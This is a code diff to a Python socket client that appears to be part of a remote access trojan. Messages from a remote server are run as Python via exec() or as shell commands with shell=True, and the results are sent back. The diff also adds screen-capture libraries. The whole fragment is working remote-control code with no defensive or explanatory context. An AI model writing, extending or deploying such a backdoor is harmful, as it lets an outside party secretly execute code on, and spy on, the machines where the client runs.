@@ -3,6 +3,11 @@ import re
 import threading
 import time
 import subprocess
+import mss
+import PIL.Image
+import PIL.ImageGrab
+import numpy as np
+import cv2
 
 
 class Client:
@@ -20,14 +25,14 @@ class Client:
 					data = req.decode()
 					if data.startswith("0"):
 						data = data[1:]
+
 					if data.split("|")[0] == "EXEC":
 						exec(data[5:])
-					if data.split("|")[0] == "CMD":
-						proc = subprocess.Popen('cmd.exe', stdin = subprocess.PIPE, stdout = subprocess.PIPE)
-						stdout, stderr = proc.communicate(data[4:])
-						self.client.send(stdout)
 
-				
+					if data.split("|")[0] == "CMD":
+						output, err = subprocess.Popen(data[4:].split(" "), stdout=subprocess.PIPE, shell=True, text=True, stderr=subprocess.PIPE).communicate()
+						self.send(f"CMD{output or (err or ' ')}")
+
 				time.sleep(0.01)
 			except:
 				try:
